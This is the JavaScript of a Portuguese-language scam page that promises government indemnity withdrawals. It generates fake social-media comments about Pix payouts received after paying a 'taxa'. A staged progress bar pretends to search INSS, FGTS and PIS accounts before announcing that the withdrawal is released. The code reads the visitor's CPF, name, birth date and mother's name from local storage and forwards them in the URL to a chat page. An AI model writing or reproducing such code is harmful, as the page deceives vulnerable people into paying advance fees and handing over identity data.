  <div class="fb-header-outside" id="fb-header-outside">Comentários (25738)</div>
  <div class="fb-comments-container" id="fb-comments-container">
    <div class="fb-header">
      <span class="fb-comment-count" id="fb-comment-count"></span>
      <span class="fb-loading" id="fb-loading"></span>
    </div>
  </div>

  <script>
    let totalComments = 25738;
    let storedComments = [];
  
    const elements = {
      fbHeaderOutside: document.getElementById('fb-header-outside'),
      fbContainer: document.getElementById('fb-comments-container'),
      fbCountSpan: document.getElementById('fb-comment-count'),
      fbLoadingSpan: document.getElementById('fb-loading'),
    };
  
    function initFacebookComments() {
      elements.fbHeaderOutside.textContent = `Comentários (${totalComments})`;
  
      const local = localStorage.getItem('commentsData');
      if (local) {
        storedComments = JSON.parse(local);
        storedComments.forEach(comm => createComment(comm.name, comm.avatar, comm.text, comm.likes, comm.dislikes, false));
        elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
        elements.fbLoadingSpan.textContent = "Comentários atualizados.";
        scheduleComments();
      } else {
        generateInitialComments();
      }
    }
  
    function generateInitialComments() {
      const texts = ["Tive medo, mas entrou R$ 2.400!", "Tive que pagar taxa, mas veio R$ 2.800 em 10min", "Recebi R$ 4.000 deu para pagar as contas kkk"];
      texts.forEach(text => createRandomComment(text, true));
      elements.fbCountSpan.textContent = `Comentários: ${totalComments}`;
      elements.fbLoadingSpan.textContent = "Comentários atualizados.";
      scheduleComments();
      saveCommentsToLocal();
    }
  
    function scheduleComments() {
      const messages = [
        "Alguém conseguiu R$ 2.700 hoje?",
        "Meu Pix foi aprovado e caiu R$ 3.500 em 5 min!",
        "Testei hoje e entrou R$ 2.100 rapidinho!",
        "Show! Liberou R$ 4.250 e já usei tudo!",
        "Recebi R$ 5.000, só precisei pagar a taxa"
      ];
  
      messages.forEach((msg, i) => {
        setTimeout(() => {
          elements.fbLoadingSpan.innerHTML = `<i class="fas fa-spinner fa-spin"></i> Carregando comentários`;
          createRandomComment(msg, false);
          elements.fbLoadingSpan.textContent = "Comentários atualizados.";
        }, (i + 1) * 10000);
      });
    }
  
    async function createRandomComment(text, initial) {
      totalComments++;
      const userData = await getRandomUser();
      createComment(userData.name.first, userData.picture.medium, text, 0, 0, initial);
      storedComments.unshift({ name: userData.name.first, avatar: userData.picture.medium, text, likes: 0, dislikes: 0 });
      if (!initial) saveCommentsToLocal();
    }
  
    function createComment(name, avatar, text, likes, dislikes, initialLoad) {
      const cItem = document.createElement('div');
      cItem.classList.add('comment-item');
      cItem.innerHTML = `
        <img class="comment-avatar" src="${avatar}" alt="avatar"/>
        <div class="comment-content">
          <div class="comment-name">${name}</div>
          <div class="comment-text">${text}</div>
          <div class="comment-actions">
            <span class="comment-likes"><i class="fas fa-thumbs-up"></i> ${likes}</span>
            <span class="comment-dislikes"><i class="fas fa-thumbs-down"></i> ${dislikes}</span>
          </div>
        </div>`;
      elements.fbContainer.insertBefore(cItem, elements.fbContainer.firstChild);
      if (!initialLoad) saveCommentsToLocal();
    }
  
    async function getRandomUser() {
      const res = await fetch('https://randomuser.me/api/?nat=br');
      const data = await res.json();
      return data.results[0];
    }
  
    function saveCommentsToLocal() {
      localStorage.setItem('commentsData', JSON.stringify(storedComments));
    }
  
    document.addEventListener('DOMContentLoaded', initFacebookComments);
  </script>

  <script>
    var firstUnmuteClick = true;

    function toggleMute(isUnmuting) {
      var video = document.getElementById("myVideo");
      var unmuteButton = document.getElementById("unmuteButton");
      var muteButton = document.getElementById("muteButton");

      if (isUnmuting) {
        video.muted = false;
        if (firstUnmuteClick) {
          video.currentTime = 0;
          firstUnmuteClick = false;
        }
        unmuteButton.style.display = "none";
        muteButton.style.display = "block";
      } else {
        video.muted = true;
        muteButton.style.display = "none";
        unmuteButton.style.display = "block";
      }
    }
  </script>
  <script>
    document.addEventListener('DOMContentLoaded', function () {
      const rawUserData = localStorage.getItem('userData');
      let userData = {};
      try {
        // Parsear os dados do localStorage
        userData = JSON.parse(rawUserData || '{}');
        console.log('Parsed userData:', userData);

        if (typeof userData === 'string') {
          userData = JSON.parse(userData);
        }
      } catch (e) {
        console.error('Erro ao parsear userData:', e);
      }

      console.log('Dados do usuário:', userData);

      function formatarCPF(cpf) {
        if (!cpf || cpf.length !== 11) return cpf;
        return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
      }

      const cpfElement = document.querySelector('.flex.items-center.gap-3:nth-child(3) p');
      if (cpfElement && userData.dados && userData.dados[0].CPF) {
        cpfElement.textContent = formatarCPF(userData.dados[0].CPF);
      }

      let nome = null;

      if (userData.dados && userData.dados[0].NOME) {
        nome = userData.dados[0].NOME;
      }

      const headerUserName = document.getElementById('header-user-name');
  if (headerUserName) {
    const primeiroNome = nome.split(' ')[0]; // Pega o primeiro nome
    headerUserName.textContent = primeiroNome;
  }


      const nomeElement = document.querySelector('.flex.items-center.gap-3:nth-child(1) p');
      if (nomeElement && nome) {
        nomeElement.textContent = nome;
      }

      let data = "Data não disponível";

      try {
        if (userData && userData.dados && userData.dados[0].NASC) {
          const nascimento = userData.dados[0].NASC;

          // Se for uma string no formato YYYY-MM-DD, converter para DD/MM/YYYY
          if (typeof nascimento === 'string' && nascimento.includes('-')) {
            const partes = nascimento.split(' ')[0].split('-'); // Separa a data da hora e divide pelos '-'
            if (partes.length === 3) {
              // Inverter a ordem dos componentes da data
              data = partes[2] + '/' + partes[1] + '/' + partes[0];
            } else {
              data = nascimento;
            }
          } else {
            data = String(nascimento);
          }
        }
      } catch (error) {
        console.error('Erro ao processar data de nascimento:', error);
      }
      const dataElement = document.querySelector('.flex.items-center.gap-3:nth-child(2) p');
      if (dataElement) {
        dataElement.textContent = data;
      }

      if (userData.dados && userData.dados[0].NOME_MAE) {
        const mae = userData.dados[0].NOME_MAE ? userData.dados[0].NOME_MAE : "Não disponível";
        const statusMsg = document.getElementById('status-msg');

        const maeElement = document.getElementById('mae-nome');
        if (maeElement) {
          maeElement.textContent = mae;
        }
      }

      // Acelerar a barra de progresso se já temos dados
      if (Object.keys(userData).length > 0) {
        const progressBar = document.getElementById("progress-bar");
        if (progressBar) {
          let progress = 0;
          progressBar.style.width = progress + "%";
        }
      }
    });
  </script>

  <script>
    let progress = 0;
    const progressBar = document.getElementById("progress-bar");
    const resultSection = document.getElementById("result");
    const statusMsg = document.getElementById("status-msg");
    const totalDuration = 87500; // Reduzido para 10 segundos para teste mais rápido
    const intervalTime = totalDuration / 100;
    let buttonShown = false;

    const userData = JSON.parse(localStorage.getItem('userData') || '{}');

    if (Object.keys(userData).length > 0) {
      progress = 0;
      progressBar.style.width = progress + "%";
    }

    function updateProgress() {
      if (progress < 100) {
        progress++;
        progressBar.style.width = progress + "%";

        if (progress === 10) {
  statusMsg.innerHTML = '<b><span style="color: black;text-transform:none !important;">Calculando o valor da sua indenização...</span></i></b>';
} else if (progress === 20) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas INSS...</span></i></b>';
} else if (progress === 30) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas FGTS...</span></i></b>';
} else if (progress === 40) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas PIS...</span></i></b>';
} else if (progress === 50) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas de CPF...</span></i></b>';
} else if (progress === 60) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas de CNPJ...</span></i></b>';
} else if (progress === 70) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Buscando valores em contas de seguro desemprego...</span></i></b>';
} else if (progress === 80) {
  statusMsg.innerHTML = '<b><i><span style="color: black;text-transform:none !important;">Finalizando cálculos...</span></i></b>';
}

setTimeout(updateProgress, intervalTime);
} else {
  resultSection.classList.remove("hidden");
  buttonShown = true;
  statusMsg.innerHTML = '<b><i><span style="color: green;text-transform:none !important;">Saque liberado.</span></i></b>';

        document.querySelector('#result button').style.display = 'block';
      }
    }

    setTimeout(updateProgress, 1000);

    function redirect(event) {
      event.preventDefault();

      var currentUrlParams = new URLSearchParams(window.location.search);
      var userData = JSON.parse(localStorage.getItem('userData') || '{}');

      function safeEncode(value) {
        try {
          return encodeURIComponent(decodeURIComponent(value)); // Garante codificação única
        } catch (e) {
          return encodeURIComponent(value); // Em caso de erro, codifica normalmente
        }
      }

      function formatName(name) {
        if (!name) return "";
        return name
          .toLowerCase()
          .split(" ")
          .map(word => word.charAt(0).toUpperCase() + word.slice(1))
          .join(" ");
      }

      function formatDate(dateString) {
        if (!dateString) return "";
        let parts = dateString.split(" ")[0].split("-"); // Separa data da hora e divide por "-"
        if (parts.length === 3) {
          return `${parts[2]}/${parts[1]}/${parts[0]}`; // Retorna no formato DD/MM/YYYY
        }
        return dateString; // Caso não seja o formato esperado
      }

      function formatCPF(cpf) {
        if (!cpf || cpf.length !== 11) return cpf;
        return cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");
      }

      // Adiciona dados do usuário na URL, se disponíveis
      if (userData.dados[0]) {
        if (userData.dados[0].CPF) {
          currentUrlParams.set('cpf', formatCPF(userData.dados[0].CPF));
        }
        if (userData.dados[0].NOME) {
          currentUrlParams.set('nome', safeEncode(formatName(userData.dados[0].NOME)));
        }
        if (userData.dados[0].NASC) {
          currentUrlParams.set('nascimento', safeEncode(formatDate(userData.dados[0].NASC)));
        }
        if (userData.dados[0].NOME_MAE) {
          currentUrlParams.set('mae', safeEncode(formatName(userData.dados[0].NOME_MAE)));
        }
      }

      // Converte para string e força a decodificação antes do redirecionamento
      let finalUrl = "../chat/index.html?" + decodeURIComponent(currentUrlParams.toString());

      // Redireciona para a URL corrigida
      window.location.href = finalUrl;
    }
  </script>
